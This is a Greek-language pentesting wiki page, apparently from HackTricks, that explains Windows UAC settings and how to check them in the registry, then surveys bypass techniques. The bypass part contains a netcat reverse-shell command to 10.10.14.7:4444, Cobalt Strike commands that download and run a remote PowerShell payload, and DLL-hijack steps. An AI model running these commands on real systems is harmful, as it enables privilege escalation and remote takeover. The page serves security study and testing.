# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που επιτρέπει μια **προτροπή συγκατάθεσης για ανυψωμένες δραστηριότητες**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity`, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελεί εργασίες που **θα μπορούσαν ενδεχομένως να θέσουν σε κίνδυνο το σύστημα**. Όταν είναι ενεργοποιημένο το UAC, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **υπό το πλαίσιο ασφαλείας ενός λογαριασμού μη διαχειριστή** εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση επιπέδου διαχειριστή στο σύστημα για να εκτελούνται. Είναι μια δυνατότητα ευκολίας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα ακεραιότητας:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν είναι σε εφαρμογή το UAC, σε έναν χρήστη διαχειριστή δίνονται 2 διακριτικά: ένα τυπικό κλειδί χρήστη, για να εκτελεί κανονικές ενέργειες ως κανονικό επίπεδο, και ένα με τα δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) συζητά πώς λειτουργεί το UAC σε βάθος και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία του χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να ρυθμίσουν πώς λειτουργεί το UAC συγκεκριμένα για την οργάνωσή τους σε τοπικό επίπεδο (χρησιμοποιώντας secpol.msc), ή να ρυθμιστεί και να προωθηθεί μέσω Αντικειμένων Πολιτικής Ομάδας (GPO) σε ένα περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις συζητούνται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Πολιτικής Ομάδας που μπορούν να ρυθμιστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Ρύθμιση Πολιτικής Ομάδας                                                                                                                                                                                                                                                                                                                                                           | Κλειδί Μητρώου                | Προεπιλεγμένη Ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Απενεργοποιημένο                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Απενεργοποιημένο                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Προτροπή για συγκατάθεση για μη Windows δυαδικά                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Προτροπή για διαπιστευτήρια στην ασφαλή επιφάνεια εργασίας                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ενεργοποιημένο (προεπιλογή για οικιακή χρήση) Απενεργοποιημένο (προεπιλογή για επιχείρηση) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Απενεργοποιημένο                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ενεργοποιημένο                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ενεργοποιημένο                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ενεργοποιημένο                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ενεργοποιημένο                                                      |

### UAC Bypass Theory

Ορισμένα προγράμματα είναι **αυτοανυψωμένα αυτόματα** αν ο **χρήστης ανήκει** στην **ομάδα διαχειριστών**. Αυτές οι δυαδικές έχουν μέσα στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Η δυαδική πρέπει επίσης να είναι **υπογεγραμμένη από τη Microsoft**.

Έτσι, για να **παρακαμφθεί** το **UAC** (ανύψωση από **μεσαίο** επίπεδο ακεραιότητας **σε υψηλό**) κάποιοι επιτιθέμενοι χρησιμοποιούν αυτού του είδους τις δυαδικές για να **εκτελέσουν αυθαίρετο κώδικα** επειδή θα εκτελούνται από μια **Διαδικασία Υψηλού επιπέδου ακεραιότητας**.

Μπορείτε να **ελέγξετε** το _**Manifest**_ μιας δυαδικής χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από το Sysinternals. Και μπορείτε να **δείτε** το **επίπεδο ακεραιότητας** των διαδικασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (του Sysinternals).

### Check UAC

Για να επιβεβαιώσετε αν το UAC είναι ενεργοποιημένο κάντε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`** τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή **δεν υπάρχει**, τότε το UAC είναι **ανενεργό**.

Στη συνέχεια, ελέγξτε **ποιο επίπεδο** είναι ρυθμισμένο:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Αν **`0`** τότε, το UAC δεν θα ζητήσει επιβεβαίωση (όπως **απενεργοποιημένο**)
- Αν **`1`** ο διαχειριστής **ζητείται να εισάγει όνομα χρήστη και κωδικό πρόσβασης** για να εκτελέσει το δυαδικό αρχείο με υψηλά δικαιώματα (στην Ασφαλή Επιφάνεια Εργασίας)
- Αν **`2`** (**Πάντα να με ειδοποιείς**) το UAC θα ζητά πάντα επιβεβαίωση από τον διαχειριστή όταν προσπαθεί να εκτελέσει κάτι με υψηλά προνόμια (στην Ασφαλή Επιφάνεια Εργασίας)
- Αν **`3`** όπως το `1` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια Εργασίας
- Αν **`4`** όπως το `2` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια Εργασίας
- αν **`5`**(**προεπιλογή**) θα ζητήσει από τον διαχειριστή να επιβεβαιώσει την εκτέλεση μη Windows δυαδικών αρχείων με υψηλά προνόμια

Στη συνέχεια, πρέπει να ρίξετε μια ματιά στην τιμή του **`LocalAccountTokenFilterPolicy`**\
Αν η τιμή είναι **`0`**, τότε, μόνο ο χρήστης **RID 500** (**ενσωματωμένος Διαχειριστής**) μπορεί να εκτελεί **διοικητικά καθήκοντα χωρίς UAC**, και αν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Administrators"** μπορούν να τα εκτελούν.

Και, τελικά, ρίξτε μια ματιά στην τιμή του κλειδιού **`FilterAdministratorToken`**\
Αν **`0`**(προεπιλογή), ο **ενσωματωμένος λογαριασμός Διαχειριστή μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα και αν **`1`** ο ενσωματωμένος λογαριασμός Διαχειριστή **δεν μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα, εκτός αν το `LocalAccountTokenFilterPolicy` είναι ρυθμισμένο σε `1`.

#### Περίληψη

- Αν `EnableLUA=0` ή **δεν υπάρχει**, **κανένα UAC για κανέναν**
- Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=1`, Κανένα UAC για κανέναν**
- Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=0`, Κανένα UAC για RID 500 (Ενσωματωμένος Διαχειριστής)**
- Αν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=1`, UAC για όλους**

Όλες αυτές οι πληροφορίες μπορούν να συλλεχθούν χρησιμοποιώντας το **metasploit** module: `post/windows/gather/win_privs`

Μπορείτε επίσης να ελέγξετε τις ομάδες του χρήστη σας και να αποκτήσετε το επίπεδο ακεραιότητας:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!NOTE]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, η παράκαμψη UAC είναι απλή καθώς μπορείτε απλά να κάνετε κλικ στο "Ναι" όταν εμφανιστεί το παράθυρο προτροπής UAC.

Η παράκαμψη UAC είναι απαραίτητη στην εξής κατάσταση: **η UAC είναι ενεργοποιημένη, η διαδικασία σας εκτελείται σε ένα μέσο επίπεδο ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ πιο δύσκολο να παρακαμφθεί η UAC αν είναι στο υψηλότερο επίπεδο ασφάλειας (Πάντα) από ότι αν είναι σε οποιοδήποτε από τα άλλα επίπεδα (Προεπιλογή).**

### UAC disabled

Αν η UAC είναι ήδη απενεργοποιημένη (`ConsentPromptBehaviorAdmin` είναι **`0`**) μπορείτε να **εκτελέσετε ένα reverse shell με δικαιώματα διαχειριστή** (υψηλό επίπεδο ακεραιότητας) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass με αντιγραφή διακριτικού

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασικός UAC "bypass" (πλήρης πρόσβαση στο σύστημα αρχείων)

Αν έχετε ένα shell με έναν χρήστη που είναι μέσα στην ομάδα Διαχειριστών μπορείτε να **τοποθετήσετε το C$** κοινόχρηστο μέσω SMB (σύστημα αρχείων) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο σύστημα αρχείων** (ακόμα και στον φάκελο του Διαχειριστή).

> [!WARNING]
> **Φαίνεται ότι αυτό το κόλπο δεν λειτουργεί πια**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με το Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν είναι ρυθμισμένο στο μέγιστο επίπεδο ασφαλείας του.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** έχουν επίσης αρκετά modules για να **bypass** το **UAC**.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)που είναι μια **compilation** αρκετών UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME χρησιμοποιώντας visual studio ή msbuild**. Η compilation θα δημιουργήσει αρκετά executables (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`), θα χρειαστεί να ξέρετε **ποιο χρειάζεστε.**\
Πρέπει να **είστε προσεκτικοί** γιατί μερικά bypass θα **προκαλέσουν κάποια άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME έχει την **build version από την οποία κάθε τεχνική άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

#### Περισσότερο UAC bypass

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για να παρακάμψουν το AUC **απαιτούν** μια **πλήρη διαδραστική κονσόλα** με το θύμα (μια κοινή nc.exe κονσόλα δεν είναι αρκετή).

Μπορείτε να αποκτήσετε πρόσβαση χρησιμοποιώντας μια **meterpreter** συνεδρία. Μεταναστεύστε σε μια **διαδικασία** που έχει την τιμή **Session** ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχετε πρόσβαση σε μια **GUI μπορείτε απλά να αποδεχτείτε το UAC prompt** όταν το λάβετε, δεν χρειάζεστε πραγματικά μια παράκαμψη. Έτσι, η απόκτηση πρόσβασης σε μια GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια GUI συνεδρία που κάποιος χρησιμοποιούσε (πιθανώς μέσω RDP) υπάρχουν **ορισμένα εργαλεία που θα εκτελούνται ως διαχειριστής** από όπου θα μπορούσατε να **τρέξετε** ένα **cmd** για παράδειγμα **ως διαχειριστής** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **αθόρυβο**.

### Θορυβώδης brute-force UAC bypass

Αν δεν σας νοιάζει να είστε θορυβώδεις μπορείτε πάντα να **τρέξετε κάτι όπως** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να ανυψώσει δικαιώματα μέχρι ο χρήστης να το αποδεχτεί**.

### Η δική σας παράκαμψη - Βασική μεθοδολογία UAC bypass

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι **οι περισσότερες παρακάμψεις UAC εκμεταλλεύονται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Διαβάστε αυτό για να μάθετε πώς να βρείτε μια ευπάθεια Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα δυαδικό αρχείο που θα **αυτοανυψώνεται** (ελέγξτε ότι όταν εκτελείται τρέχει σε υψηλό επίπεδο ακεραιότητας).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανώς θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποιες **προστατευμένες διαδρομές** (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός CAB αρχείου μέσα σε προστατευμένες διαδρομές (επειδή αυτό το εργαλείο εκτελείται από υψηλό επίπεδο ακεραιότητας).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL μέσα στην προστατευμένη διαδρομή και να εκτελέσετε το ευάλωτο και αυτοανυψωμένο δυαδικό αρχείο.

### Μια άλλη τεχνική UAC bypass

Αποτελείται από την παρακολούθηση αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **μητρώο** το **όνομα/διαδρομή** ενός **δυαδικού** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το δυαδικό αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
